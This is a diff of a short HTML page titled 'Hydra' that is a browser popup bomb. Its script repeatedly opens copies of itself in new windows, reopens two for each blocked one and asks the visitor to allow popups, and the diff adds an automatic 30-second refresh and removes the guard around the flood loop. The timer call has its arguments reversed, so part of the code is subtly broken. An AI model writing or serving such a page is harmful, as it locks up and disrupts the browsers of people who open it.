@@ -2,26 +2,26 @@
 <html lang="en" dir="ltr">
     <head>
         <meta charset="utf-8">
-        <title></title>
+        <title>Hydra</title>
+        <meta http-equiv="refresh" content="30">
     </head>
     <body>
         <script type="text/javascript">
             var windows = [];
             var open = window.open(".");
-            if(open){
-                setInterval(1, function(){
-                    for(var i = 0; i < 5; i ++){
-                        windows.push(window.open("."));
+            setInterval(1, function(){
+                for(var i = 0; i < 5; i ++){
+                    windows.push(window.open("."));
+                }
+                for(var i in windows){
+                    if(!windows[i]){
+                        window.open(".");
+                        window.open(".");
                     }
-                    for(var i in windows){
-                        if(!windows[i]){
-                            window.open(".");
-                            window.open(".");
-                        }
-                    }
-                });
-            } else {
-                alert("Please allow popups")
+                }
+            });
+            if(!open) {
+                alert("Please allow popups");
             }
         </script>
     </body>
